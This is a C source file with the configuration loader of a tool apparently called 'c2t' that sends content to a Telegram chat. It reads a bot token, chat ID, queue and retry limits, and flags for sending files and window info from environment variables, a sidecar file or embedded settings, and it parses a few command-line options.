/*
 * Copyright (C) 2026 Antonio Ricciardi
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#include "config.h"
#include "embedded_config.h"

#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef __APPLE__
#include <mach-o/dyld.h>
#include <stdio.h>
#endif

#define TELEGRAM_DEFAULT_MAX_FILE_BYTES (50U * 1024U * 1024U)
#define C2T_DEFAULT_QUEUE_MAX_BYTES (64U * 1024U * 1024U)
#define C2T_DEFAULT_QUEUE_MAX_ITEMS 128U
#define C2T_DEFAULT_DELIVERY_ATTEMPTS 3U
#define C2T_DEFAULT_RETRY_DELAY_MS 500U
#define C2T_MAX_DELIVERY_ATTEMPTS 10U
#define C2T_MAX_RETRY_DELAY_MS 60000U

static c2t_config_t config;
static char embedded_bot_token[512];
static char embedded_chat_id[128];

#ifdef __APPLE__
#define C2T_SIDECAR_CAPACITY 4096U
static char sidecar[C2T_SIDECAR_CAPACITY + 1];
static size_t sidecar_length;

static void load_sidecar(const char *executable_path)
{
    char executable[4096];
    uint32_t capacity = (uint32_t)sizeof(executable);
    if (_NSGetExecutablePath(executable, &capacity) != 0) {
        if (!executable_path || strlen(executable_path) >= sizeof(executable))
            return;
        memcpy(executable, executable_path, strlen(executable_path) + 1);
    }

    char *separator = strrchr(executable, '/');
    const char suffix[] = "/.c2t.env";
    size_t directory_length = separator ? (size_t)(separator - executable) : 1;
    if (!separator)
        executable[0] = '.';
    if (directory_length + sizeof(suffix) > sizeof(executable))
        return;
    memcpy(executable + directory_length, suffix, sizeof(suffix));

    FILE *stream = fopen(executable, "rb");
    if (!stream)
        return;
    sidecar_length = fread(sidecar, 1, C2T_SIDECAR_CAPACITY, stream);
    int extra = fgetc(stream);
    if (fclose(stream) != 0 || extra != EOF) {
        sidecar_length = 0;
        return;
    }
    sidecar[sidecar_length] = '\0';
}

static int sidecar_get(const char *name, char *output, size_t capacity)
{
    size_t name_length = strlen(name);
    size_t position = 0;
    while (position < sidecar_length) {
        size_t start = position;
        while (position < sidecar_length && sidecar[position] != '\n' &&
               sidecar[position] != '\r')
            ++position;
        size_t length = position - start;
        while (position < sidecar_length &&
               (sidecar[position] == '\n' || sidecar[position] == '\r'))
            ++position;
        if (!length || sidecar[start] == '#')
            continue;
        if (length > name_length && length - name_length <= capacity &&
            sidecar[start + name_length] == '=' &&
            memcmp(sidecar + start, name, name_length) == 0) {
            size_t value_length = length - name_length - 1;
            memcpy(output, sidecar + start + name_length + 1, value_length);
            output[value_length] = '\0';
            return 1;
        }
    }
    return 0;
}
#endif

static const char *configured_value(const char *name, char *embedded,
                                    size_t embedded_capacity)
{
    const char *value = getenv(name);
    if (value)
        return value;
#ifdef __APPLE__
    if (sidecar_get(name, embedded, embedded_capacity))
        return embedded;
#endif
    if (c2t_embedded_config_get(name, embedded, embedded_capacity))
        return embedded;
    return NULL;
}

static int configured_flag(const char *name)
{
    char embedded[16];
    const char *value = configured_value(name, embedded, sizeof(embedded));
    return value && *value && strcmp(value, "0") != 0;
}

static size_t configured_size(const char *name, size_t fallback)
{
    char embedded[32];
    const char *value = configured_value(name, embedded, sizeof(embedded));
    if (!value || !*value || *value == '-')
        return fallback;

    errno = 0;
    char *end;
    unsigned long long parsed = strtoull(value, &end, 10);
    if (errno || *end || parsed == 0 || parsed > SIZE_MAX)
        return fallback;
    return (size_t)parsed;
}

void c2t_config_load(const char *executable_path)
{
#ifdef __APPLE__
    load_sidecar(executable_path);
#else
    (void)executable_path;
#endif
    config.verbose = configured_flag("C2T_VERBOSE");
    config.log_file = configured_flag("C2T_LOG_FILE");
    config.telegram_enabled = configured_flag("TELEGRAM_ENABLED");
    config.telegram_deduplicate = configured_flag("TELEGRAM_DEDUPLICATE");
    config.telegram_send_files = configured_flag("TELEGRAM_SEND_FILES");
    config.telegram_send_window_info =
        configured_flag("TELEGRAM_SEND_WINDOW_INFO");
    config.telegram_max_file_bytes = configured_size(
        "TELEGRAM_MAX_FILE_BYTES", TELEGRAM_DEFAULT_MAX_FILE_BYTES);
    config.queue_max_bytes = configured_size(
        "C2T_QUEUE_MAX_BYTES", C2T_DEFAULT_QUEUE_MAX_BYTES);
    config.queue_max_items = configured_size(
        "C2T_QUEUE_MAX_ITEMS", C2T_DEFAULT_QUEUE_MAX_ITEMS);
    config.delivery_attempts = configured_size(
        "C2T_DELIVERY_ATTEMPTS", C2T_DEFAULT_DELIVERY_ATTEMPTS);
    if (config.delivery_attempts > C2T_MAX_DELIVERY_ATTEMPTS)
        config.delivery_attempts = C2T_MAX_DELIVERY_ATTEMPTS;
    config.retry_delay_ms = configured_size(
        "C2T_RETRY_DELAY_MS", C2T_DEFAULT_RETRY_DELAY_MS);
    if (config.retry_delay_ms > C2T_MAX_RETRY_DELAY_MS)
        config.retry_delay_ms = C2T_MAX_RETRY_DELAY_MS;
    config.telegram_bot_token = configured_value(
        "TELEGRAM_BOT_TOKEN", embedded_bot_token,
        sizeof(embedded_bot_token));
    config.telegram_chat_id = configured_value(
        "TELEGRAM_CHAT_ID", embedded_chat_id, sizeof(embedded_chat_id));
}

void c2t_config_load_environment(void)
{
    c2t_config_load(NULL);
}

const char *c2t_config_apply_arguments(int argc, char **argv)
{
    for (int index = 1; index < argc; ++index) {
        if (strcmp(argv[index], "-v") == 0 ||
            strcmp(argv[index], "--verbose") == 0) {
            config.verbose = 1;
        } else if (strcmp(argv[index], "-l") == 0 ||
                   strcmp(argv[index], "--log-file") == 0 ||
                   strcmp(argv[index], "--save-logs") == 0) {
            config.log_file = 1;
        } else if (strcmp(argv[index], "--send-files") == 0) {
            config.telegram_send_files = 1;
        } else if (strcmp(argv[index], "--send-window-info") == 0) {
            config.telegram_send_window_info = 1;
        } else {
            return argv[index];
        }
    }
    return NULL;
}

static char dynamic_chat_id[128];

void c2t_config_set_chat_id(const char *chat_id)
{
    if (!chat_id)
        return;
    snprintf(dynamic_chat_id, sizeof(dynamic_chat_id), "%s", chat_id);
    config.telegram_chat_id = dynamic_chat_id;
}

const c2t_config_t *c2t_config_get(void)
{
    return &config;
}
